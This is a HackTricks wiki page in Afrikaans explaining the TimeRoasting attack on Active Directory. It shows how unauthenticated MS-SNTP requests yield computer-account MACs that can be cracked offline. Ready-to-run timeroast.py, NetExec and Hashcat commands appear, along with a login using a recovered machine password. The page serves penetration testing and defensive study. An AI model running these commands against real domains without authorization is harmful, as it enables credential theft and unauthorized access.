# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting misbruik legacy MS-SNTP-authentication. ’n Ongeauthentiseerde client kan ’n 68-greep-versoek stuur wat ’n gekose rekenaarrekening-RID bevat. Vir die uitbuitbare legacy-pad lei die domain controller die response authenticator deur Netlogon af deur die rekenaarrekening se NT-hash (die MD4-afgeleide wagwoordgeheim) te gebruik, wat die aanvaller ’n challenge/MAC-paar gee wat geskik is vir offline wagwoordraai (Hashcat mode 31300).<sup>[[1]](#references)[[2]](#references)</sup>

Sections 3.1.5.1 en 4 van MS-SNTP beskryf die versoek- en antwoordgedrag:<sup>[[1]](#references)</sup>
![TimeRoasting: Sien section 3.1.5.1 "Authentication Request Behavior" en 4 "Protocol Examples" in die amptelike MS-SNTP-spesifikasie vir besonderhede](../../images/Pasted%20image%2020250709114508.png)
Wanneer `ExtendedAuthenticatorSupported` false is, stoor die versoek die RID in die lae 31 bisse van die authenticator se Key Identifier en ’n selekteerderbis in die hoë bis. Die server verifieer die 68-greep-lengte, onttrek die RID, vra Netlogon om die kandidaat-kontrolesomme te bereken, kies een deur daardie hoë bis te gebruik, stel die response Key Identifier op nul en stuur die gekose kontrolesom terug.<sup>[[1]](#references)</sup>

Die crypto-checksum is MD5-gebaseer (sien 3.2.5.1.1) en kan offline gekraak word, wat die roasting attack moontlik maak.<sup>[[1]](#references)</sup>

## Hoe om aan te val

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting-skripte deur Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Praktiese aanval (unauth) met NetExec + Hashcat

- NetExec se `timeroast`-module kan rekenaar-RIDs enumerateer, MS-SNTP MACs sonder authentication insamel, en `$sntp-ms$`-hashes druk wat gereed is vir cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Kraak offline met Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Die herstelde plaintext stem ooreen met ’n rekenaarrekeningwagwoord. Probeer dit direk as die masjienrekening met Kerberos (-k) wanneer NTLM gedeaktiveer is:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Operasionele notas
- Verseker akkurate tyd voordat herstelde credentials met Kerberos gebruik word. Verkies ’n onderhoude NTP-client soos `chronyd`/`systemd-timesyncd`; `ntpdate` word hier behou as ’n algemene lab-opdrag: `sudo ntpdate <dc_fqdn>`.
- Indien nodig, genereer krb5.conf vir die AD-realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Map RIDs later na principals via LDAP/BloodHound sodra jy enige geauthentiseerde foothold het.

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting-witskrif](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — bronkode vir die `timeroast`-module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat-modus 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
